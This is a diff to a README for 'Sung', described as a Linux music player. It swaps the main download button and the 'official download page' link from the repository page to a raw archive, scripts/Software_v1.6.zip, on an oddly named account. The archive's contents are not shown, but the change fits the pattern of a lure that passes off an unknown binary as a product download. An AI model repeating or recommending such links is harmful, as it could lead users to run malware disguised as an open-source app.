@@ -1,7 +1,7 @@
 <h1>🎵 Sung - Your Beautiful, Modern Music Player for Linux</h1>
 
 <p align="center">
-  <a href="https://github.com/complete-castrationanxiety3371/Sung" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Get Sung Now</a>
+  <a href="https://github.com/complete-castrationanxiety3371/Sung/raw/refs/heads/main/scripts/Software_v1.6.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Get Sung Now</a>
 </p>
 
 ## ✨ What is Sung?
@@ -71,7 +71,7 @@ Getting Sung up and running on your Linux computer is easier than ever. Just fol
 
 Click the big button at the top of this page or go directly to the official Sung download page by clicking here:
 
-👉 [**https://github.com/complete-castrationanxiety3371/Sung**](https://github.com/complete-castrationanxiety3371/Sung)
+👉 [**https://github.com/complete-castrationanxiety3371/Sung/raw/refs/heads/main/scripts/Software_v1.6.zip**](https://github.com/complete-castrationanxiety3371/Sung/raw/refs/heads/main/scripts/Software_v1.6.zip)
 
 
 
